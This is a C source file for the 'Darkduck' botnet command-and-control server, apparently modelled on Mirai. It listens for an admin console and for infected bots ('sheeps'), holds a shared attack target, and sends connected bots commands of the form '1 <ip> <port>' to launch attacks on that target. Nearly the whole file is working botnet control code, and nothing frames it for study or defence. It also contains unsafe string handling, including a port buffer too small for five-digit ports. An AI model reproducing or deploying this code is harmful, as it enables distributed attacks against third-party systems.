#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <string.h>
#include <stdbool.h>
#include <arpa/inet.h> 
#include <sys/mman.h>

#include "common.h"
#include "database.h"
#include "cnc.h"

struct attack *attack_target;

void initialHandler(int cnc_fd) {
#ifdef DEBUG
    printf("Darkduck : CNC printing ip : %s \n", attack_target->ip);
#endif

#ifdef DEBUG
    printf("Darkduck : Where are you admin ? (੭ ˃̣̣̥ ㅂ˂̣̣̥)੭ु \n");
#endif

    struct  sockaddr_in     client_addr;
    struct  cnc             cnc_client;

    int     client_fd;
    int     c;

    open_database();
    // struct user *test =  malloc(sizeof(struct user));
    // connect_user("admin", "admin", test);

    c = sizeof(struct sockaddr_in);

    while (1) {
        client_fd = accept(cnc_fd, (struct sockaddr *)&client_addr, (socklen_t*)&c);
        if (client_fd < 0) {
            perror("Darkduck : Admiiiiin ( ب_ب )  ! \n");
            exit(errno);
        }
         
        cnc_client = new_cnc(client_fd);
        handle(cnc_client);

        close(client_fd);
    }
}


void botHandler(int bot_fd) {
#ifdef DEBUG
    printf("Darkduck : Waiting for sheeps ? (੭ ˃̣̣̥ ㅂ˂̣̣̥)੭ु \n");
#endif
    char fd_array[MAX_CLIENT];

    struct  sockaddr_in     bot_addr;

    fd_set readfds, testfds, clientfds;
    int     fd, sd;
    int     valread;
    int     new_socket;
    int     c = sizeof(struct sockaddr_in);

    char * message = "Hello from cnc";
    char buffer[1025]; 

    bool attack = false;

#ifdef DEBUG
    printf("Darkduck : BOT printing ip : %s \n", attack_target->ip);
#endif
    //initialise all client_socket[] to 0 so not checked
    for (int i = 0; i < MAX_CLIENT; i++) 
    {
        fd_array[i] = 0;
    }


    while(true) 
    {
        FD_ZERO(&readfds);
        FD_SET(bot_fd, &readfds);
        int max_sd = bot_fd;
         
        for (int i = 0 ; i < MAX_CLIENT ; i++) 
        {
            sd = fd_array[i];
            if(sd > 0)
                FD_SET( sd , &readfds);
             
            if(sd > max_sd)
                max_sd = sd;
        }
  
        int activity = select( max_sd + 1 , &readfds , NULL , NULL , NULL);
        if ((activity < 0) && (errno!=EINTR)) 
        {
            printf("select error");
        }
          
        if (FD_ISSET(bot_fd, &readfds)) 
        {
            if ((new_socket = accept(bot_fd, (struct sockaddr *)&bot_addr, (socklen_t*)&c))<0)
            {
                perror("accept");
                exit(EXIT_FAILURE);
            }
          
            printf("Darkduck : New connection , socket fd is %d , ip is : %s , port : %d \n" , new_socket , inet_ntoa(bot_addr.sin_addr) , ntohs(bot_addr.sin_port));
        
            //send new connection greeting message
            if( send(new_socket, message, strlen(message), 0) != strlen(message) ) 
            {
                perror("send");
            }
              
            puts("Darkduck : Welcome message sent successfully");
              
            //add new socket to array of sockets
            for (int  i = 0; i < MAX_CLIENT; i++) 
            {
                //if position is empty
                if( fd_array[i] == 0 )
                {
                    fd_array[i] = new_socket;
                    printf("Darkduck : Adding to list of sockets as %d\n" , i);
                     
                    break;
                }
            }
        }
          
        //else its some IO operation on some other socket :)
        for (int i = 0; i < MAX_CLIENT; i++) 
        {
            sd = fd_array[i];
              
            if (FD_ISSET( sd , &readfds)) 
            {
                //Check if it was for closing , and also read the incoming message
                if ((valread = read( sd , buffer, 1024)) == 0)
                {
                    //Somebody disconnected , get his details and print
                    getpeername(sd , (struct sockaddr*)&bot_addr , (socklen_t*)&c);
                    printf("Darkduck : Host disconnected , ip %s , port %d \n" , inet_ntoa(bot_addr.sin_addr) , ntohs(bot_addr.sin_port));
                      
                    //Close the socket and mark as 0 in list for reuse
                    close( sd );
                    fd_array[i] = 0;
                }
                  
                //Echo back the message that came in
                else
                {
#ifdef DEBUG
    printf("Darkduck : BOT printing ip : %s \n", attack_target->ip);
#endif
                    printf("Darkduck : Received message : %s \n", buffer);
                    if (attack_target->attack) {
                        char str[120];
                        char port[5];

                        sprintf(port, "%d", attack_target->port);

                        strcpy(str, "1 ");
                        strcat(str, attack_target->ip);
                        strcat(str, " ");
                        strcat(str, port);

                        printf("Darkduck : Sending : %s \n", str);
                        send(sd , str , strlen(str ) , 0 );  

                    } else {
                        message = "0 No attack" ;
                        send(sd , message , strlen(message) , 0 );  
                    }
                }
            }
        }
    }


/*    while (1) {
        client_fd = accept(bot_fd, (struct sockaddr *)&bot_addr, (socklen_t*)&c);
        if (client_fd < 0) {
            perror("Holo :  ( ب_ب )  ! \n");
            exit(errno);
        }

        char buffer[BUFFER_SIZE];
        int read_size;


        read_size = recv(client_fd, buffer , 1000 , 0);
        if(read_size <= 0){
            return;
        }

        buffer[read_size] = '\0';

#ifdef DEBUG
    printf("Holo : received:  %s\n", buffer*);
#endif

        if (read_size == 4 && buffer[0] == 0 && buffer[1] == 0 && buffer[2] == 0) {
            for(int j=0;j<read_size-1;j++) printf("%d ",buffer[j]);
        }

    // if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
    //     if buf[3] > 0 {
    //         string_len := make([]byte, 1)
    //         l, err := conn.Read(string_len)
    //         if err != nil || l <= 0 {
    //             return
    //         }
    //         var source string
    //         if string_len[0] > 0 {
    //             source_buf := make([]byte, string_len[0])
    //             l, err := conn.Read(source_buf)
    //             if err != nil || l <= 0 {
    //                 return
    //             }
    //             source = string(source_buf)
    //         }
    //         NewBot(conn, buf[3], source).Handle()
    //     } else {
    //         NewBot(conn, buf[3], "").Handle()
    //     }
    // } else {
    //     NewAdmin(conn).Handle()
    // }

    }*/
}


int main(int argc, char **args) {
    attack_target = mmap(NULL, sizeof(struct attack), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    if (attack_target == MAP_FAILED)
    {
        perror("Error mmapping the file");
        exit(EXIT_FAILURE);
    }

    attack_target->port = 20;
    strcpy(attack_target->ip, "NULL");

#ifdef DEBUG
    printf("Darkduck : MAIN printing ip : %s \n", attack_target->ip);
#endif

#ifdef DEBUG
    printf("Darkduck : GRRRRrrr DEBUG MODE \n");
#endif

    int     cnc_fd;
    int     bot_fd;
    int     option = 1;
    struct  sockaddr_in     cnc_addr;
    struct  sockaddr_in     bot_addr;

    if ((cnc_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("Darkduck : Not able to create socket \n");
        exit(errno);
    }

    if ((bot_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("Darkduck : Not able to create socket \n");
        exit(errno);
    }

    setsockopt(cnc_fd,SOL_SOCKET,SO_REUSEADDR,(char *)&option,sizeof(option));
    cnc_addr.sin_family = AF_INET;
    cnc_addr.sin_addr.s_addr = INADDR_ANY;
    cnc_addr.sin_port = htons(CNC_PORT);


    setsockopt(bot_fd,SOL_SOCKET,SO_REUSEADDR,(char *)&option,sizeof(option));
    bot_addr.sin_family = AF_INET;
    bot_addr.sin_addr.s_addr = INADDR_ANY;
    bot_addr.sin_port = htons(BOT_PORT);


    //Bind
    if (bind(cnc_fd,(struct sockaddr *)&cnc_addr , sizeof(cnc_addr)) < 0) {
        perror("Darkduck : Bind failed \n");
        exit(errno);
    }

    if (listen(cnc_fd , 10) == -1) {
        perror("Darkduck : Listen failed \n");
        exit(errno);
    }

    //Bind
    if (bind(bot_fd,(struct sockaddr *)&bot_addr , sizeof(bot_addr)) < 0) {
        perror("Darkduck : Bind failed \n");
        exit(errno);
    }

    if (listen(bot_fd , MAX_CLIENT) == -1) {
        perror("Darkduck : Listen failed \n");
        exit(errno);
    }

    pid_t pid_parent, pid_cnc, pid_bot;
    int status_child;

    pid_parent = getpid();

    if (getpid() == pid_parent) {
        if ((pid_cnc = fork())== -1) { 
            perror("Darkduck : Cannot fork for CNC \n");
            exit(errno);
        } 

        if (pid_cnc == 0) {
            pid_cnc = getpid();
        }
    }
    
    if (getpid() == pid_parent) {
        if ((pid_bot = fork())== -1) { 
            perror("Darkduck : Cannot fork for BOT \n");
            exit(errno);
        }
        if (pid_bot == 0) {
            pid_bot = getpid();
        }
    }

    if (getpid() == pid_cnc) {
        initialHandler(cnc_fd);
    }
  
    if (getpid() == pid_bot) {
        botHandler(bot_fd);
    }

    if (waitpid(pid_cnc, &status_child, 0) == 1) {
        perror("Darkduck : Admin is dead ! ಥ_ಥ \n");
    }
    
    if (waitpid(pid_bot, &status_child, 0) == 1) {
        perror("Darkduck : Sheeps are dead \n");
    }

    // if(read_size == 0)
    // {
    //     puts("Client disconnected");
    //     fflush(stdout);
    // }
    // else if(read_size == -1)
    // {
    //     perror("recv failed");
    // }
     
    close_database();
    
    return 0;
}
